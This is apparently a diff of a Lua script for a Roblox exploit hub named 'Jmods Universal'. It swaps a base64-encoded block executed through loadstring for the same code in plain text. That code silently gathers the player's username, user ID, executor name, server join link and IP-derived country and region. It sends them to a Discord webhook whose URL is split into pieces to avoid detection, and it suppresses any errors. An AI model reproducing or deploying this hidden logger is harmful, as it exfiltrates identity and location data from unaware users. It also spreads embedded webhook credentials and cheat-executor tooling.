@@ -230,32 +230,138 @@ LoadSavedTheme()
 
 -- [[ Notificación + WHID Check - Jmods Universal ]] --
 
--- Función para decodificar Base64
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local function base64decode(data)
-	data = string.gsub(data, '[^'..b..'=]', '')
-	return (data:gsub('.', function(x)
-		if x == '=' then return '' end
-		local r,f='',(b:find(x)-1)
-		for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-		return r
-	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-		if #x ~= 8 then return '' end
-		local c=0
-		for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
-		return string.char(c)
-	end))
-end
+-- [[ Notificación + WHID Check - Jmods Universal ]] --
 
--- Aquí va el script codificado en base64
-local encoded = [[
-LS0gW1sgTm90aWZpY2FjacOzbiArIFdISUQgQ2hlY2sgLSBKbW9kcyBVbml2ZXJzYWwgXV0gLS0KCnRhc2suZGVsYXkoMC4zLCBmdW5jdGlvbigpCiAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgSHR0cFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKICAgICAgICBsb2NhbCBDb3JlR3VpID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBwbGFjZU5hbWUgPSAiSnVlZ28gZGVzY29ub2NpZG8iCiAgICAgICAgbG9jYWwgZWplY3V0YWRvciA9ICJEZXNjb25vY2lkbyIKICAgICAgICBsb2NhbCBqb2JJZCA9IGdhbWUuSm9iSWQKICAgICAgICBsb2NhbCB1c2VySWQgPSBwbGF5ZXIuVXNlcklkCiAgICAgICAgbG9jYWwgd2hpZCA9IHRvc3RyaW5nKHVzZXJJZCkgLi4gIi0iIC4uIHN0cmluZy5zdWIoam9iSWQsIDEsIDgpCgogICAgICAgIC0tIExpc3RhIGRlIFdISURzIGJsb3F1ZWFkb3MgZGlyZWN0YW1lbnRlIGVuIGVsIHNjcmlwdAogICAgICAgIGxvY2FsIGJsb2NrZWRXSElEcyA9IHsKICAgICAgICAgICAgWyIiXSA9IHRydWUsCiAgICAgICAgICAgIFsiIl0gPSB0cnVlLAogICAgICAgIH0KCiAgICAgICAgaWYgYmxvY2tlZFdISURzW3doaWRdIHRoZW4KICAgICAgICAgICAgd2FybigiV0hJRCBibG9xdWVhZG86ICIgLi4gd2hpZCkKICAgICAgICAgICAgbG9jYWwgaGlkZGVuVUkgPSBDb3JlR3VpOkZpbmRGaXJzdENoaWxkKCJIaWRkZW5VSSIpCiAgICAgICAgICAgIGlmIGhpZGRlblVJIHRoZW4KICAgICAgICAgICAgICAgIGhpZGRlblVJOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGpvaW5MaW5rID0gInJvYmxveDovL2V4cGVyaWVuY2VzL3N0YXJ0P3BsYWNlSWQ9IiAuLiBnYW1lLlBsYWNlSWQgLi4gIiZnYW1lSW5zdGFuY2VJZD0iIC4uIGpvYklkCiAgICAgICAgbG9jYWwgd2ViTGluayA9ICJodHRwczovL3d3dy5yb2Jsb3guY29tL2dhbWVzLyIgLi4gZ2FtZS5QbGFjZUlkCgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcGxhY2VOYW1lID0gZ2FtZTpHZXRTZXJ2aWNlKCJNYXJrZXRwbGFjZVNlcnZpY2UiKTpHZXRQcm9kdWN0SW5mbyhnYW1lLlBsYWNlSWQpLk5hbWUKICAgICAgICBlbmQpCgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZWplY3V0YWRvciA9IGlkZW50aWZ5ZXhlY3V0b3IgYW5kIGlkZW50aWZ5ZXhlY3V0b3IoKSBvciAoZ2V0ZXhlY3V0b3JuYW1lIGFuZCBnZXRleGVjdXRvcm5hbWUoKSkgb3IgIk90cm8iCiAgICAgICAgZW5kKQoKICAgICAgICAtLSBNYXBlbyBkZSBjw7NkaWdvcyBkZSBwYcOtcyBhIG5vbWJyZXMgY29tcGxldG9zCiAgICAgICAgbG9jYWwgY291bnRyeU5hbWVzID0gewogICAgICAgICAgICBBRiA9ICJBZmdhbmlzdMOhbiIsIEFMID0gIkFsYmFuaWEiLCBEWiA9ICJBcmdlbGlhIiwgQUQgPSAiQW5kb3JyYSIsIEFPID0gIkFuZ29sYSIsCiAgICAgICAgICAgIEFSID0gIkFyZ2VudGluYSIsIEFNID0gIkFybWVuaWEiLCBBVSA9ICJBdXN0cmFsaWEiLCBBVCA9ICJBdXN0cmlhIiwgQVogPSAiQXplcmJhaXnDoW4iLAogICAgICAgICAgICBCUyA9ICJCYWhhbWFzIiwgQkQgPSAiQmFuZ2xhZMOpcyIsIEJFID0gIkLDqWxnaWNhIiwgQk8gPSAiQm9saXZpYSIsIEJSID0gIkJyYXNpbCIsCiAgICAgICAgICAgIEJHID0gIkJ1bGdhcmlhIiwgQ0EgPSAiQ2FuYWTDoSIsIENMID0gIkNoaWxlIiwgQ04gPSAiQ2hpbmEiLCBDTyA9ICJDb2xvbWJpYSIsCiAgICAgICAgICAgIENSID0gIkNvc3RhIFJpY2EiLCBIUiA9ICJDcm9hY2lhIiwgQ1UgPSAiQ3ViYSIsIENaID0gIkNoZXF1aWEiLCBESyA9ICJEaW5hbWFyY2EiLAogICAgICAgICAgICBETyA9ICJSZXDDumJsaWNhIERvbWluaWNhbmEiLCBFQyA9ICJFY3VhZG9yIiwgRUcgPSAiRWdpcHRvIiwgU1YgPSAiRWwgU2FsdmFkb3IiLAogICAgICAgICAgICBFRSA9ICJFc3RvbmlhIiwgRkkgPSAiRmlubGFuZGlhIiwgRlIgPSAiRnJhbmNpYSIsIEdFID0gIkdlb3JnaWEiLCBERSA9ICJBbGVtYW5pYSIsCiAgICAgICAgICAgIEdSID0gIkdyZWNpYSIsIEdUID0gIkd1YXRlbWFsYSIsIEhOID0gIkhvbmR1cmFzIiwgSFUgPSAiSHVuZ3LDrWEiLCBJUyA9ICJJc2xhbmRpYSIsCiAgICAgICAgICAgIElOID0gIkluZGlhIiwgSUQgPSAiSW5kb25lc2lhIiwgSVIgPSAiSXLDoW4iLCBJRSA9ICJJcmxhbmRhIiwgSUwgPSAiSXNyYWVsIiwKICAgICAgICAgICAgSVQgPSAiSXRhbGlhIiwgSlAgPSAiSmFww7NuIiwgS1ogPSAiS2F6YWppc3TDoW4iLCBLUiA9ICJDb3JlYSBkZWwgU3VyIiwgTVggPSAiTcOpeGljbyIsCiAgICAgICAgICAgIE1EID0gIk1vbGRhdmlhIiwgTUEgPSAiTWFycnVlY29zIiwgTkwgPSAiUGHDrXNlcyBCYWpvcyIsIE5aID0gIk51ZXZhIFplbGFuZGEiLAogICAgICAgICAgICBOSSA9ICJOaWNhcmFndWEiLCBORyA9ICJOaWdlcmlhIiwgTk8gPSAiTm9ydWVnYSIsIFBBID0gIlBhbmFtw6EiLCBQWSA9ICJQYXJhZ3VheSIsCiAgICAgICAgICAgIFBFID0gIlBlcsO6IiwgUEggPSAiRmlsaXBpbmFzIiwgUEwgPSAiUG9sb25pYSIsIFBUID0gIlBvcnR1Z2FsIiwgUk8gPSAiUnVtYW7DrWEiLAogICAgICAgICAgICBSVSA9ICJSdXNpYSIsIFNBID0gIkFyYWJpYSBTYXVkaXRhIiwgUlMgPSAiU2VyYmlhIiwgU0cgPSAiU2luZ2FwdXIiLCBTSyA9ICJFc2xvdmFxdWlhIiwKICAgICAgICAgICAgU0kgPSAiRXNsb3ZlbmlhIiwgWkEgPSAiU3Vkw6FmcmljYSIsIEVTID0gIkVzcGHDsWEiLCBTRSA9ICJTdWVjaWEiLCBDSCA9ICJTdWl6YSIsCiAgICAgICAgICAgIFRIID0gIlRhaWxhbmRpYSIsIFRSID0gIlR1cnF1w61hIiwgVUEgPSAiVWNyYW5pYSIsIEFFID0gIkVtaXJhdG9zIMOBcmFiZXMgVW5pZG9zIiwKICAgICAgICAgICAgR0IgPSAiUmVpbm8gVW5pZG8iLCBVUyA9ICJFc3RhZG9zIFVuaWRvcyIsIFVZID0gIlVydWd1YXkiLCBWRSA9ICJWZW5lenVlbGEiLCBWTiA9ICJWaWV0bmFtIgogICAgICAgIH0KCiAgICAgICAgbG9jYWwgY291bnRyeSA9ICJEZXNjb25vY2lkbyIKICAgICAgICBsb2NhbCByZWdpb24gPSAiRGVzY29ub2NpZG8iCgogICAgICAgIGxvY2FsIGlwaW5mb1JlcSA9IChzeW4gYW5kIHN5bi5yZXF1ZXN0KSBvciAoaHR0cF9yZXF1ZXN0KSBvciAocmVxdWVzdCkgb3IgKGh0dHAgYW5kIGh0dHAucmVxdWVzdCkKICAgICAgICBpZiBpcGluZm9SZXEgdGhlbgogICAgICAgICAgICBsb2NhbCBnZW9SZXNwb25zZSA9IGlwaW5mb1JlcSh7CiAgICAgICAgICAgICAgICBVcmwgPSAiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIsCiAgICAgICAgICAgICAgICBNZXRob2QgPSAiR0VUIgogICAgICAgICAgICB9KQogICAgICAgICAgICBpZiBnZW9SZXNwb25zZSBhbmQgZ2VvUmVzcG9uc2UuU3RhdHVzQ29kZSA9PSAyMDAgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgZ2VvRGF0YSA9IEh0dHBTZXJ2aWNlOkpTT05EZWNvZGUoZ2VvUmVzcG9uc2UuQm9keSkKICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnlDb2RlID0gZ2VvRGF0YS5jb3VudHJ5IG9yICJEZXNjb25vY2lkbyIKICAgICAgICAgICAgICAgIGNvdW50cnkgPSBjb3VudHJ5TmFtZXNbY291bnRyeUNvZGVdIGFuZCAoY291bnRyeU5hbWVzW2NvdW50cnlDb2RlXSAuLiAiIC0gIiAuLiBjb3VudHJ5Q29kZSkgb3IgY291bnRyeUNvZGUKICAgICAgICAgICAgICAgIHJlZ2lvbiA9IGdlb0RhdGEucmVnaW9uIG9yICJEZXNjb25vY2lkbyIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGZvbGRlck5hbWUgPSAiSm1vZHNfTm90aWZ5RmxhZyIKICAgICAgICBpZiBub3QgQ29yZUd1aTpGaW5kRmlyc3RDaGlsZChmb2xkZXJOYW1lKSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGZsYWcgPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIpCiAgICAgICAgICAgIGZsYWcuTmFtZSA9IGZvbGRlck5hbWUKICAgICAgICAgICAgZmxhZy5QYXJlbnQgPSBDb3JlR3VpCgogICAgICAgICAgICBsb2NhbCBlbWJlZERhdGEgPSB7CiAgICAgICAgICAgICAgICB0aXRsZSA9ICLinIUgSm1vZHMgVW5pdmVyc2FsIiwKICAgICAgICAgICAgICAgIGNvbG9yID0gdG9udW1iZXIoIkZGQzBDQiIsIDE2KSwKICAgICAgICAgICAgICAgIHRodW1ibmFpbCA9IHsKICAgICAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly93d3cucm9ibG94LmNvbS9hc3NldC10aHVtYm5haWwvaW1hZ2U/YXNzZXRJZD0iIC4uIGdhbWUuUGxhY2VJZCAuLiAiJndpZHRoPTQyMCZoZWlnaHQ9NDIwJmZvcm1hdD1wbmciCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZm9vdGVyID0gewogICAgICAgICAgICAgICAgICAgIHRleHQgPSAiSm1vZHMgVW5pdmVyc2FsIiwKICAgICAgICAgICAgICAgICAgICBpY29uX3VybCA9ICIiCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZmllbGRzID0geyB7CiAgICAgICAgICAgICAgICAgICAgbmFtZSA9ICLwn5OMIEluZm9ybWFjacOzbiIsCiAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSAi8J+RpCBVc3VhcmlvOiAiIC4uIHBsYXllci5OYW1lIC4uICIgQCIgLi4gcGxheWVyLkRpc3BsYXlOYW1lIC4uICIiIC4uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiXG7wn46uIEp1ZWdvOiAiIC4uIHBsYWNlTmFtZSAuLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxu8J+noCBFamVjdXRhZG9yOiAiIC4uIGVqZWN1dGFkb3IgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcbvCfhpQgV0hJRDogYCIgLi4gd2hpZCAuLiAiYCIgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcbvCfjI0gUGHDrXM6ICIgLi4gY291bnRyeSAuLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxu8J+Pme+4jyBSZWdpw7NuOiAiIC4uIHJlZ2lvbiAuLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxu8J+VkiBIb3JhOiAiIC4uIG9zLmRhdGUoIiVZLSVtLSVkICVIOiVNOiVTIikgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcbvCfjJAgW1ZlciBqdWVnbyBlbiBsYSB3ZWJdKCIgLi4gd2ViTGluayAuLiAiKSIgLi4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICJcbvCflJcgVW5pcnNlIGFsIHNlcnZpZG9yOlxuYGBgIiAuLiBqb2luTGluayAuLiAiYGBgIiwKICAgICAgICAgICAgICAgICAgICBpbmxpbmUgPSB0cnVlCiAgICAgICAgICAgICAgICB9fSwKICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9IG9zLmRhdGUoIiElWS0lbS0lZFQlSDolTTolU1oiKQogICAgICAgICAgICB9CgogICAgICAgICAgICBsb2NhbCBqc29uRGF0YSA9IEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoe2VtYmVkcyA9IHtlbWJlZERhdGF9fSkKICAgICAgICAgICAgbG9jYWwgbGluayA9ICJodHRwczovL2Rpc2MiIC4uICJvcmQuY29tL2FwaS93ZSIgLi4gImJob29rIiAuLiAicy8xMzc0ODAzMyIgLi4gIjkxMjcxODAxMDQ0Ly0wU2tSaSIgLi4gInVITDViYlA5IiAuLiAiOFZ6NTJYQTVBZk9OWlNnamN2dTRyIiAuLiAiQzZNLUZUbDZuVzNJVmQ0LWUiIC4uICIyeF9laDVkdU1KVGYxcFdrIgoKICAgICAgICAgICAgbG9jYWwgcmVxID0gKHN5biBhbmQgc3luLnJlcXVlc3QpIG9yIChodHRwX3JlcXVlc3QpIG9yIChyZXF1ZXN0KSBvciAoaHR0cCBhbmQgaHR0cC5yZXF1ZXN0KQogICAgICAgICAgICBpZiByZXEgdGhlbgogICAgICAgICAgICAgICAgcmVxKHsKICAgICAgICAgICAgICAgICAgICBVcmwgPSBsaW5rLAogICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBCb2R5ID0ganNvbkRhdGEKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQoKICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAtLSBzaWxlbmNpb3NvCiAgICBlbmQKZW5kKQo=
-]]
+task.delay(0.3, function()
+    local success, err = pcall(function()
+        local HttpService = game:GetService("HttpService")
+        local CoreGui = game:GetService("CoreGui")
+        local player = game.Players.LocalPlayer
+        local placeName = "Juego desconocido"
+        local ejecutador = "Desconocido"
+        local jobId = game.JobId
+        local userId = player.UserId
+        local whid = tostring(userId) .. "-" .. string.sub(jobId, 1, 8)
 
--- Decodificamos y ejecutamos
-loadstring(base64decode(encoded))()
+        -- Lista de WHIDs bloqueados directamente en el script
+        local blockedWHIDs = {
+            [""] = true,
+            [""] = true,
+        }
 
+        if blockedWHIDs[whid] then
+            warn("WHID bloqueado: " .. whid)
+            local hiddenUI = CoreGui:FindFirstChild("HiddenUI")
+            if hiddenUI then
+                hiddenUI:Destroy()
+            end
+            return
+        end
 
+        local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
+        local webLink = "https://www.roblox.com/games/" .. game.PlaceId
+
+        pcall(function()
+            placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+        end)
+
+        pcall(function()
+            ejecutador = identifyexecutor and identifyexecutor() or (getexecutorname and getexecutorname()) or "Otro"
+        end)
+
+        -- Mapeo de códigos de país a nombres completos
+        local countryNames = {
+            AF = "Afganistán", AL = "Albania", DZ = "Argelia", AD = "Andorra", AO = "Angola",
+            AR = "Argentina", AM = "Armenia", AU = "Australia", AT = "Austria", AZ = "Azerbaiyán",
+            BS = "Bahamas", BD = "Bangladés", BE = "Bélgica", BO = "Bolivia", BR = "Brasil",
+            BG = "Bulgaria", CA = "Canadá", CL = "Chile", CN = "China", CO = "Colombia",
+            CR = "Costa Rica", HR = "Croacia", CU = "Cuba", CZ = "Chequia", DK = "Dinamarca",
+            DO = "República Dominicana", EC = "Ecuador", EG = "Egipto", SV = "El Salvador",
+            EE = "Estonia", FI = "Finlandia", FR = "Francia", GE = "Georgia", DE = "Alemania",
+            GR = "Grecia", GT = "Guatemala", HN = "Honduras", HU = "Hungría", IS = "Islandia",
+            IN = "India", ID = "Indonesia", IR = "Irán", IE = "Irlanda", IL = "Israel",
+            IT = "Italia", JP = "Japón", KZ = "Kazajistán", KR = "Corea del Sur", MX = "México",
+            MD = "Moldavia", MA = "Marruecos", NL = "Países Bajos", NZ = "Nueva Zelanda",
+            NI = "Nicaragua", NG = "Nigeria", NO = "Noruega", PA = "Panamá", PY = "Paraguay",
+            PE = "Perú", PH = "Filipinas", PL = "Polonia", PT = "Portugal", RO = "Rumanía",
+            RU = "Rusia", SA = "Arabia Saudita", RS = "Serbia", SG = "Singapur", SK = "Eslovaquia",
+            SI = "Eslovenia", ZA = "Sudáfrica", ES = "España", SE = "Suecia", CH = "Suiza",
+            TH = "Tailandia", TR = "Turquía", UA = "Ucrania", AE = "Emiratos Árabes Unidos",
+            GB = "Reino Unido", US = "Estados Unidos", UY = "Uruguay", VE = "Venezuela", VN = "Vietnam"
+        }
+
+        local country = "Desconocido"
+        local region = "Desconocido"
+
+        local ipinfoReq = (syn and syn.request) or (http_request) or (request) or (http and http.request)
+        if ipinfoReq then
+            local geoResponse = ipinfoReq({
+                Url = "https://ipinfo.io/json",
+                Method = "GET"
+            })
+            if geoResponse and geoResponse.StatusCode == 200 then
+                local geoData = HttpService:JSONDecode(geoResponse.Body)
+                local countryCode = geoData.country or "Desconocido"
+                country = countryNames[countryCode] and (countryNames[countryCode] .. " - " .. countryCode) or countryCode
+                region = geoData.region or "Desconocido"
+            end
+        end
+
+        local folderName = "Jmods_NotifyFlag"
+        if not CoreGui:FindFirstChild(folderName) then
+            local flag = Instance.new("Folder")
+            flag.Name = folderName
+            flag.Parent = CoreGui
+
+            local embedData = {
+                title = "✅ Jmods Universal",
+                color = tonumber("FFC0CB", 16),
+                thumbnail = {
+                    url = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=420&height=420&format=png"
+                },
+                footer = {
+                    text = "Jmods Universal",
+                    icon_url = ""
+                },
+                fields = { {
+                    name = "📌 Información",
+                    value = "👤 Usuario: " .. player.Name .. " @" .. player.DisplayName .. "" ..
+                            "\n🎮 Juego: " .. placeName ..
+                            "\n🧠 Ejecutador: " .. ejecutador ..
+                            "\n🆔 WHID: " .. whid .. "" ..
+                            "\n🌍 País: " .. country ..
+                            "\n🏙️ Región: " .. region ..
+                            "\n🕒 Hora: " .. os.date("%Y-%m-%d %H:%M:%S") ..
+                            "\n🌐 [Ver juego en la web](" .. webLink .. ")" ..
+                            "\n🔗 Unirse al servidor:\n
+" .. joinLink .. "
+",
+                    inline = true
+                }},
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+
+            local jsonData = HttpService:JSONEncode({embeds = {embedData}})
+            local link = "https://disc" .. "ord.com/api/we" .. "bhook" .. "s/1385412071830589552/XKZPpzAbj_6cjpNzTh50RHtBYXXirpdqi9jy1H49u8zIC7hbkPFP1KGnpLDY_P6VivH5"
+
+            local req = (syn and syn.request) or (http_request) or (request) or (http and http.request)
+            if req then
+                req({
+                    Url = link,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonData
+                })
+            end
+        end
+    end)
+
+    if not success then
+        -- silencioso
+    end
+end)
 
 
 
